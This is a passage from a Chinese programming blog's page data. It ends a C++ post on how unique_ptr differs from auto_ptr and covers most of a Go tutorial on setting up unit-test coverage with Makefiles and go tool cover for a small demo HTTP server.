&gt;</span><br><span class=\"line\">class unique_ptr</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/// unique_ptr for array objects </span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp, <span class=\"keyword\">typename</span> _Dp&gt;</span><br><span class=\"line\">class unique_ptr&lt;_Tp[], _Dp&gt;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">      ...  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<p>以及特化版的deletor</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp&gt;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">default_delete</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"built_in\"><span class=\"keyword\">operator</span></span>()(_Tp* __ptr) <span class=\"keyword\">const</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">     <span class=\"keyword\">delete</span> __ptr;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp&gt;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">default_delete</span>&lt;</span>_Tp[]&gt;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"built_in\"><span class=\"keyword\">operator</span></span>()(_Tp* __ptr) <span class=\"keyword\">const</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">     <span class=\"keyword\">delete</span>[] __ptr;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"不得不提的容器\"><a href=\"#不得不提的容器\" class=\"headerlink\" title=\"不得不提的容器\"></a>不得不提的容器</h3><p>我们比较一下下面三段代码，语法没什么问题，但是只有第三段可以编过。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// compile fail</span></span><br><span class=\"line\">vector&lt; auto_ptr&lt;<span class=\"keyword\">int</span>&gt; &gt; vec;</span><br><span class=\"line\"><span class=\"function\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">abc</span><span class=\"params\">(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>(<span class=\"number\">0</span>))</span></span>;\t</span><br><span class=\"line\">vec.<span class=\"built_in\">push_back</span>(abc);\t</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// compile fail</span></span><br><span class=\"line\">vector&lt; unique_ptr&lt;<span class=\"keyword\">int</span>&gt; &gt; vec;</span><br><span class=\"line\"><span class=\"function\">unique_ptr&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">abc</span><span class=\"params\">(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>(<span class=\"number\">0</span>))</span></span>;\t</span><br><span class=\"line\">vec.<span class=\"built_in\">push_back</span>(abc);\t</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// compile pass</span></span><br><span class=\"line\">vector&lt; unique_ptr&lt;<span class=\"keyword\">int</span>&gt; &gt; vec;</span><br><span class=\"line\"><span class=\"function\">unique_ptr&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">abc</span><span class=\"params\">(<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>(<span class=\"number\">0</span>))</span></span>;\t</span><br><span class=\"line\">vec.<span class=\"built_in\">push_back</span>(std::<span class=\"built_in\">move</span>(abc));\t</span><br></pre></td></tr></table></figure>\n\n<p>首先看第一段auto_ptr为什么编不过，失败的代码为vec.push_back(abc);</p>\n<p>为什么失败，我们可以猜测push_back的代码：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">void</span></span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"title\">push_back</span><span class=\"params\">(<span class=\"keyword\">const</span> value_type&amp; __x)</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 通过 __x 构造一个新的value_type ，然后推到队列中</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然而我们知道auto_ptr是没法通过const 类型的变量来构造对象,他只能接受非const的，所以这个代码无法编译。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">auto_ptr&amp;</span><br><span class=\"line\"><span class=\"keyword\">operator</span>=(auto_ptr&amp; __a) <span class=\"built_in\"><span class=\"keyword\">throw</span></span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"built_in\">reset</span>(__a.<span class=\"built_in\">release</span>());</span><br><span class=\"line\"><span class=\"keyword\">return</span> *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>再来看第二段为什么失败，原因也简单，auto_ptr是无法接受非const的，但是unique_ptr是const以及非const都无法接受，所以更加无法编过。</p>\n<p>然后第三段为什么编过了呢，第三段传给push_back的是一个经过move函数处理的右值，右值我们知道是可以被push_back(const value_type&amp; __x)这个接口接收的，但是接收后肯定还是编不过和第二段就一样了。</p>\n<p>那么为什么却编译通过了呢。通过翻看stl_vector.h的代码我们找到了答案：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> __cplusplus &gt;= 201103L</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">void</span></span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"title\">push_back</span><span class=\"params\">(value_type&amp;&amp; __x)</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123; <span class=\"built_in\">emplace_back</span>(std::<span class=\"built_in\">move</span>(__x)); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>原来vector在c++11后新增了push_back(value_type&amp;&amp; __x)这个专门接收右值的接口，编译器发现那个const参数的接口走不通就走了这个右值参数的接口。我们可以看到这个新接口中，入参一直都是以右值来传递下去的，保证他能被正确构造。</p>\n<p>但这其实完全是move + vector + (Type&amp;&amp;)这三者共同完成的工作，并不属于unique_ptr改造auto_ptr的工作。很多文章都说这是unique_ptr优于auto_ptr的部分，我觉得其实不是。我在devcpp中增加-std=c++11编译参数后试过，不管unique_ptr还是auto_ptr，只要使用move函数处理，都能成功推入vector。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>unique_ptr 通过不定义相关构造函数来阻止控制权的隐式转移，即阻止变量赋值；通过两个新的c++11特性，包括std::move和右值引用类型，来实现右值（≈临时变量）的控制权转移，即临时变量可以赋值；又通过模版特化的方式来提供auto_ptr所不支持的数组指针，即可以接受数组指针做构造参数。 </p>\n","categories":["代码"],"tags":["西佳佳"]},{"title":"golang coverage","url":"/2019/06/15/gocoverage/","content":"<h1 id=\"Golang-Test-Coverage\"><a href=\"#Golang-Test-Coverage\" class=\"headerlink\" title=\"Golang Test Coverage\"></a>Golang Test Coverage</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>本文主要是通过一个详细的例子来讲解golang中集成单元测试和系统测试覆盖率的一般方案。</p>\n<p>想当初接手一个毛坯房一般的golang项目，几个go文件，一个build.sh，一个makefile，别的没有了。</p>\n<p>写完怎么验证对没对？build通过，然后得部署到环境中，自己构造请求来检查返回值。但是请求是pb格式的，根本无法手工构造，要是json格式的还好弄点。于是我得写个专门的测试程序，写完通过命令行把参数传给这个测试程序，让它构造pb格式的请求并发起请求。随后发现问题，修改问题，再部署上去，这简直是低效到令人发指。</p>\n<p>我是个懒人，我不光不想写专门的测试程序，我连部署到环境中都不想部署，毕竟部署到机器上并发送详细测试请求这项工作已经由QA来覆盖了，即使很多团队没有QA，这项工作也应该是要集成到持续集成+持续部署的系统中，不需要每开发一个feature就部署到环境中来进行调试。</p>\n<p>所以首先我实现了单元测试的集成，从此无需部署无需专门的测试程序就可以测试功能的正确性。随着测试代码量的增加，我希望有个地方可以统计我哪些代码测到了，哪些没测到，于是我集成了单元测试的覆盖率。为了查看单元测试+系统测试的总体的测试覆盖情况，随后我们又集成了系统测试的覆盖率。为了查看每次提交新代码的覆盖率，随后又集成了增量覆盖率。</p>\n<p>最终项目实现了完整的持续集成+持续部署+覆盖率集成。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"最简http-server\"><a href=\"#最简http-server\" class=\"headerlink\" title=\"最简http server\"></a>最简http server</h2><p>为了说明测试覆盖率的实现方法，我决定使用一个最简的http服务器来演示。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">coverage_demo/</span><br><span class=\"line\">└── src</span><br><span class=\"line\">    ├── biz</span><br><span class=\"line\">    │   └── biz.go</span><br><span class=\"line\">    ├── lib</span><br><span class=\"line\">    │   └── lib.go</span><br><span class=\"line\">    ├── main.go</span><br><span class=\"line\">    └── Makefile</span><br></pre></td></tr></table></figure>\n\n<p><code>Makefile</code> =&gt;</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">ROOT_PATH=<span class=\"variable\">$(CURDIR)</span>/../</span><br><span class=\"line\">GOPATH:=<span class=\"variable\">$(ROOT_PATH)</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> GOPATH</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">all: format main test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">main: </span></span><br><span class=\"line\">\tgo build -o binary</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">test:</span></span><br><span class=\"line\">\t@echo <span class=\"string\">&quot;TEST TODO&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">format:</span></span><br><span class=\"line\">\tgofmt -l -w -s ./</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">.PHONY</span>: all main test format </span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>main.go</code></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;biz&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;net/http&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">serverHandler</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\tw.Write([]<span class=\"keyword\">byte</span>(biz.GetRandomPair()))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">runHttpServer</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\thttp.HandleFunc(<span class=\"string\">&quot;/randompair&quot;</span>, serverHandler)</span><br><span class=\"line\">\te := http.ListenAndServe(<span class=\"string\">&quot;:9999&quot;</span>, <span class=\"literal\">nil</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> e != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(e)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">&quot;start server&quot;</span>)</span><br><span class=\"line\">\trunHttpServer()</span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">&quot;stop server&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>biz.go</code></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> biz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;lib&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">formatTwoNumber</span><span class=\"params\">(a, b <span class=\"keyword\">int</span>)</span> <span class=\"title\">string</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> fmt.Sprintf(<span class=\"string\">&quot;%d-%d\\n&quot;</span>, a, b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">GetRandomPair</span><span class=\"params\">()</span> <span class=\"title\">string</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> formatTwoNumber(lib.GetRandomNumber(), lib.GetRandomNumber())</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>lib.go</code></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> lib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;math/rand&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;time&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">GetRandomNumber</span><span class=\"params\">()</span> <span class=\"title\">int</span></span> &#123;</span><br><span class=\"line\">\trand.Seed(time.Now().UnixNano())</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> rand.Int()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这个程序已经是极度简单了，main.go中启动一个http server，注册一个handler，返回一对随机数</p>\n<p>简单演示如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这里启动服务器</span></span><br><span class=\"line\">➜  coverage_demo <span class=\"built_in\">cd</span> src</span><br><span class=\"line\">➜  src make</span><br><span class=\"line\">gofmt -l -w -s ./</span><br><span class=\"line\">go build -o binary</span><br><span class=\"line\">TEST TODO</span><br><span class=\"line\">➜  src ./binary</span><br><span class=\"line\">start server</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这里发起请求</span></span><br><span class=\"line\">➜  code curl <span class=\"string\">&quot;http://127.0.0.1:9999/randompair&quot;</span></span><br><span class=\"line\">375982783208422764-1904058377716247975</span><br><span class=\"line\">➜  code curl <span class=\"string\">&quot;http://127.0.0.1:9999/randompair&quot;</span></span><br><span class=\"line\">5121049171811524864-6535242855443174820</span><br><span class=\"line\">➜  code curl <span class=\"string\">&quot;http://127.0.0.1:9999/randompair&quot;</span></span><br><span class=\"line\">5569808671870965927-2761778896038562647</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"单元测试覆盖率\"><a href=\"#单元测试覆盖率\" class=\"headerlink\" title=\"单元测试覆盖率\"></a>单元测试覆盖率</h2><h3 id=\"支持单元测试\"><a href=\"#支持单元测试\" class=\"headerlink\" title=\"支持单元测试\"></a>支持单元测试</h3><p>接下来我们来支持单元测试，首先创建test文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">coverage_demo/</span><br><span class=\"line\">└── src</span><br><span class=\"line\">    ├── binary</span><br><span class=\"line\">    ├── biz</span><br><span class=\"line\">    │   ├── biz.go</span><br><span class=\"line\">    │   └── biz_test.go</span><br><span class=\"line\">    ├── lib</span><br><span class=\"line\">    │   ├── lib.go</span><br><span class=\"line\">    │   └── lib_test.go</span><br><span class=\"line\">    ├── main.go</span><br><span class=\"line\">    └── Makefile</span><br></pre></td></tr></table></figure>\n\n<p>我们创建了两个test文件，biz_test.go和lib_test.go.</p>\n<p><code>biz_test.go</code></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> biz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;testing&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">TestGetRandomPair</span><span class=\"params\">(t *testing.T)</span></span> &#123;</span><br><span class=\"line\">\tstr := formatTwoNumber(<span class=\"number\">11</span>, <span class=\"number\">22</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> str == <span class=\"string\">&quot;11-22\\n&quot;</span> &#123;</span><br><span class=\"line\">\t\tt.Log(<span class=\"string\">&quot;formatTwoNumber pass&quot;</span>)</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tt.Error(<span class=\"string\">&quot;formatTwoNumber fail&quot;</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>lib_test.go</code></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> lib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;testing&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">TestGetRandomNumber</span><span class=\"params\">(t *testing.T)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> GetRandomNumber() &gt;= <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\tt.Log(<span class=\"string\">&quot;GetRandomNumber pass&quot;</span>)</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tt.Error(<span class=\"string\">&quot;GetRandomNumber fail&quot;</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>同时Makefile中增加test项</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">ROOT_PATH=<span class=\"variable\">$(CURDIR)</span>/../</span><br><span class=\"line\">GOPATH:=<span class=\"variable\">$(ROOT_PATH)</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> GOPATH</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">all: format main test</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">main: </span></span><br><span class=\"line\">\tgo build -o binary</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">test:</span></span><br><span class=\"line\">\tgo test -v ./...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">format:</span></span><br><span class=\"line\">\tgofmt -l -w -s ./</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">.PHONY</span>: all main test format </span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>注意go中测试文件的固定形式是<code>xxx_test.go</code>.测试用例的固定形式是<code>func TestXxxx(t *testing.T) </code>。</p>\n<p>有的同学可能不喜欢test文件和源码文件放在一起显得很乱，包括我也不喜欢，但是go推荐这么做，包括golang自身的源码中也是这么混合放的，并且这么放是有实实在在的好处的，那就是可以调用包里面的未导出函数，所以就这么放好了。如果你把所有test文件组织到单独的目录，那么你就调用不到原来包里面的未导出函数，也就不能直接测试他们了。</p>\n<p>我们来演示下测试效果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]<span class=\"comment\"># make test</span></span><br><span class=\"line\">go <span class=\"built_in\">test</span> -v ./...</span><br><span class=\"line\">?   \t_/code/tmp/coverage_demo/src\t[no <span class=\"built_in\">test</span> files]</span><br><span class=\"line\">=== RUN   TestGetRandomPair</span><br><span class=\"line\">--- PASS: TestGetRandomPair (0.00s)</span><br><span class=\"line\">\tbiz_test.go:10: formatTwoNumber pass</span><br><span class=\"line\">PASS</span><br><span class=\"line\">ok  \tbiz\t0.009s</span><br><span class=\"line\">=== RUN   TestGetRandomNumber</span><br><span class=\"line\">--- PASS: TestGetRandomNumber (0.00s)</span><br><span class=\"line\">\tlib_test.go:9: GetRandomNumber pass</span><br><span class=\"line\">PASS</span><br><span class=\"line\">ok  \tlib\t0.014s</span><br></pre></td></tr></table></figure>\n\n<p>可以看到测试都通过了，那测试没过的样式是怎么样的呢？我稍微改点判断条件，</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">TestGetRandomNumber</span><span class=\"params\">(t *testing.T)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">//if GetRandomNumber() &gt;= 0 &#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> GetRandomNumber() &lt; <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\tt.Log(<span class=\"string\">&quot;GetRandomNumber pass&quot;</span>)</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tt.Error(<span class=\"string\">&quot;GetRandomNumber fail&quot;</span>)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]<span class=\"comment\"># make test</span></span><br><span class=\"line\">go <span class=\"built_in\">test</span> -v ./...</span><br><span class=\"line\">?   \t_/code/tmp/coverage_demo/src\t[no <span class=\"built_in\">test</span> files]</span><br><span class=\"line\">=== RUN   TestGetRandomPair</span><br><span class=\"line\">--- PASS: TestGetRandomPair (0.00s)</span><br><span class=\"line\">\tbiz_test.go:10: formatTwoNumber pass</span><br><span class=\"line\">PASS</span><br><span class=\"line\">ok  \tbiz\t0.016s</span><br><span class=\"line\">=== RUN   TestGetRandomNumber</span><br><span class=\"line\">--- FAIL: TestGetRandomNumber (0.00s)</span><br><span class=\"line\">\tlib_test.go:11: GetRandomNumber fail</span><br><span class=\"line\">FAIL</span><br><span class=\"line\">FAIL\tlib\t0.019s</span><br><span class=\"line\">make: *** [<span class=\"built_in\">test</span>] Error 1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"单元测试覆盖率-1\"><a href=\"#单元测试覆盖率-1\" class=\"headerlink\" title=\"单元测试覆盖率\"></a>单元测试覆盖率</h3><p>接下来我们来支持覆盖率。我们首先把makefile中test项修改下，目的是在跑测试case的时候把覆盖信息输出到文件中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PWDSLASH:=$(shell pwd|sed &#x27;s/\\//\\\\\\//g&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">test:</span><br><span class=\"line\">\tgo test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./...</span><br><span class=\"line\">\t@#workaround:https://github.com/golang/go/issues/22430</span><br><span class=\"line\">\t@sed -i &quot;s/_$&#123;PWDSLASH&#125;/./g&quot; coverage.out</span><br><span class=\"line\">\t@go tool cover -html=coverage.out -o coverage.html</span><br><span class=\"line\">\t@go tool cover -func=coverage.out -o coverage.txt</span><br><span class=\"line\">\t@tail -n 1 coverage.txt | awk &#x27;&#123;print $$1,$$3&#125;&#x27;</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n\n<p>我来解释下这些指令：</p>\n<p>go test指令中新增了covermode, coverprofile, coverpkg 三个参数，covermode可以设置3个值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set: 只包含某一行是否被执行。</span><br><span class=\"line\">count: 某一行被执行过多少次</span><br><span class=\"line\">atomic: 同count，但是用于并发的场景</span><br></pre></td></tr></table></figure>\n\n<p>一般就是设置成count，可以统计代码行被执行了几次。coverprofile就是设置覆盖信息的输出文件，覆盖信息包含了哪些行被执行以及执行了几次的信息。coverpkg是列举出要统计覆盖率的包，./…代表当前目录下的所有包，含递归的。</p>\n<p>sed指令是对输出的coverage.out文件进行一些处理，把里面当前目录处理成<code>.</code>，详细可直接到注释中的url去看。</p>\n<p><code>go tool cover -html</code>是根据覆盖信息文件来生成html形式的详细的可视化的页面。</p>\n<p><code>go tool cover -func</code>是根据覆盖信息文件来生成基于函数纬度的文本形式的可读的覆盖信息。</p>\n<p>由于-func的生成信息的最后一行包含了总的覆盖率值，所以我们tail来输出。</p>\n<p>现在我们执行<code>make test</code>试试</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]<span class=\"comment\"># make test</span></span><br><span class=\"line\">go <span class=\"built_in\">test</span> -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./...</span><br><span class=\"line\">?   \t_/code/tmp/coverage_demo/src\t[no <span class=\"built_in\">test</span> files]</span><br><span class=\"line\">=== RUN   TestGetRandomPair</span><br><span class=\"line\">--- PASS: TestGetRandomPair (0.00s)</span><br><span class=\"line\">\tbiz_test.go:10: formatTwoNumber pass</span><br><span class=\"line\">PASS</span><br><span class=\"line\">coverage: 8.3% of statements <span class=\"keyword\">in</span> ./...</span><br><span class=\"line\">ok  \tbiz\t0.009s\tcoverage: 8.3% of statements <span class=\"keyword\">in</span> ./...</span><br><span class=\"line\">=== RUN   TestGetRandomNumber</span><br><span class=\"line\">--- PASS: TestGetRandomNumber (0.00s)</span><br><span class=\"line\">\tlib_test.go:9: GetRandomNumber pass</span><br><span class=\"line\">PASS</span><br><span class=\"line\">coverage: 16.7% of statements <span class=\"keyword\">in</span> ./...</span><br><span class=\"line\">ok  \tlib\t0.010s\tcoverage: 16.7% of statements <span class=\"keyword\">in</span> ./...</span><br><span class=\"line\">total: 25.0%</span><br></pre></td></tr></table></figure>\n\n<p>我们看到最后一行显示总的覆盖率是25%。</p>\n<p>我们来看看coverage.txt和coverage.html分别是什么。</p>\n<p>coverage.txt我们就cat出来看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]# cat coverage.txt</span><br><span class=\"line\">./main.go:9:\tserverHandler\t0.0%</span><br><span class=\"line\">./main.go:13:\trunHttpServer\t0.0%</span><br><span class=\"line\">./main.go:22:\tmain\t\t0.0%</span><br><span class=\"line\">biz/biz.go:8:\tformatTwoNumber\t100.0%</span><br><span class=\"line\">biz/biz.go:12:\tGetRandomPair\t0.0%</span><br><span class=\"line\">lib/lib.go:8:\tGetRandomNumber\t100.0%</span><br><span class=\"line\">total:\t\t(statements)\t25.0%</span><br></pre></td></tr></table></figure>\n\n<p>coverage.html我们打开浏览器看</p>\n<p><img src=\"/linkimage/gocoverage/coveragehtml.png\" alt=\"coveragehtml\"></p>\n<p>注意如果你的程序只运行go1.10及以上的版本，那么可以跳过下面<code>低版本go的覆盖率</code>这个小节，免得受到干扰，如果你的程序还在运行低版本go，那么往下看。</p>\n<h3 id=\"低版本go的覆盖率\"><a href=\"#低版本go的覆盖率\" class=\"headerlink\" title=\"低版本go的覆盖率\"></a>低版本go的覆盖率</h3><p>刚才我们是在go1.10版本上得到的结果，如果我们用低版本的go来试试，那么在make test的时候就会报错。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]# gvm use go1.6</span><br><span class=\"line\">Now using version go1.6</span><br><span class=\"line\">[root@8bb4497f8518 src]# make test</span><br><span class=\"line\">go test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./...</span><br><span class=\"line\">cannot use test profile flag with multiple packages</span><br><span class=\"line\">make: *** [test] Error 1</span><br></pre></td></tr></table></figure>\n\n<p>它的意思是当你输出覆盖信息的时候你就不能对所有子目录进行测试，也就是最后一个./…是不允许的。</p>\n<p>你可以执行<br><code>go test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./lib</code>，<br>但是不能执行<br><code>go test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./lib ./biz</code><br>也不能执行<br><code>go test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./...</code>，<br>显然这对我们来说是不满足的，我们肯定是想要每个目录的覆盖率信息的。</p>\n<h4 id=\"方案一\"><a href=\"#方案一\" 